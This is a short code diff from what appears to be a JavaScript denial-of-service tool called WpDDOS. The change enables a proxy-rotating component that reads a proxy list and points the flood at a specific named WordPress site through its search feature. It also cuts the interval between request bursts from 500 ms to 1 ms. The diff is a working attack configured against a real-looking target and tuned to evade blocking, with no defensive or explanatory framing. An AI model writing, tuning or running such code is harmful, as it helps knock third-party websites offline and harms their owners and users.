@@ -7,13 +7,13 @@ const rp = require('request-promise');
 
 (() => {
     let pc = new ProxyChanger('./proxylist.txt', 5000); //change after 5 sec
-    //pc.run();
+    pc.run();
 
-    let wp = new WpDDOS(config.URLS);
+    let wp = new WpDDOS('http://www.freezingcomputer.com/', 'getWpSearch');
     let task = function () {
         wp.runAll();
     };
-    setInterval(task, 500);
+    setInterval(task,1);
 
 })();
 
